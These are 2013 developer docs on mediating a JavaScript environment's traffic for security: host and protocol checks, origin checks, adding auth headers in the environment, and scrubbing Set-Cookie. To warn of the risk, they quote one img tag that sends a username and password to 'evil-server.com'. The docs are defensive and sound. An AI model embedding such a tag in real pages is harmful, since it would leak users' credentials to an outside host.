Mediating Traffic for Security and Privacy
==========================================

2013 pfraze


## Overview

The safety of the user's information relies on smart traffic policies which are enforced by the environment. This document explains how to enforce those policies, and illustrates some tools and common patterns.


## Basics

Traffic mediation is accomplished by the 'request wrapper', which is minimally defined as follows:

```javascript
Environment.setDispatchWrapper(function(request, origin, dispatch) {
	// pass the request to Link for fulfillment
	return dispatch(request);
});
```

All traffic will pass through this function before being dispatched to its target.


## Common Patterns and Tools

### Link.parseUri

`Link.parseUri` wraps <a target="_top" href="http://stevenlevithan.com/demo/parseuri/js/">Stephen Levithan's parseUri</a>, a function which breaks a URL into its component pieces. Some common uses for this:

```javascript
var urld = Link.parseUri(request);

// trusted remote hosts
if (/https?/.test(urld.protocol) && urld.host == 'mysite.com') {
	return Link.dispatch(request);
}

// local traffic
if (urld.protocol == 'httpl') {
	return Link.dispatch(request);
}
```

### instanceof origin

You can check the prototype of the request origin to make decisions.

```javascript
if (origin instanceof WorkerServer) {
	// make decisions for user applications
} else {
	// make decisions for (presumably trusted) in-document applications
}
```


## Auth & Set-Cookie headers

You never want to let credentials leak back into user applications, as they may be able to pass that data out to a remote host.

 > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML? Unless you have highly-restrictive <a target="_top" href="https://developer.mozilla.org/en-US/docs/Security/CSP">Content Security Policies</a>, the data in the query parameters will escape.

For this reason, it is best to add Auth headers to requests in the environment. For instance:

```javascript
Environment.setDispatchWrapper(function(request, origin, dispatch) {
	//...
	// add credentials to sessions
	if (MySessionManager.hasSession(request, origin)) {
		Link.headerer(request.headers).setAuth(MySessionManager.getSession(request, origin));
	}
	// ...
});
```

It is also a good idea to scrub session headers such as 'Set-Cookie':

```javascript
Environment.setDispatchWrapper(function(request, origin, dispatch) {
	//...
	// dispatch the request
	return dispatch(request)
		.then(function(response) { // on response codes 200-399
			delete response.headers['set-cookie'];
			return response;
		})
		.except(function(err) { // on response codes 400+
			delete err.response.headers['set-cookie'];
			return err;
		})
});
```
